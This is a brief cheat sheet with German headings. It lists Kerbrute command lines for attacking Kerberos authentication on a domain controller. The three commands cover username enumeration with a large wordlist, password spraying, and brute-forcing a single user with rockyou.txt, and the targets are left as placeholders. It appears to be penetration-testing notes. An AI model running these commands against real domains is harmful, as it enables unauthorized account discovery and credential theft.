
## Beispiele für Kerbrute

### User Enumeration 

```
kerbrute_linux_amd64 userenum -d {DOMAIN} --dc {RHOST} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
```
### Password Spraying

```
kerbrute_linux_amd64 passwordspray -d {DOMAIN} --dc {RHOST} {user.txt} {passwords.txt}
```
### Brute Force

```
kerbrute_linux_amd64 bruteuser -d {DOMAIN} --dc {RHOST} /usr/share/wordlists/rockyou.txt {USER}
```

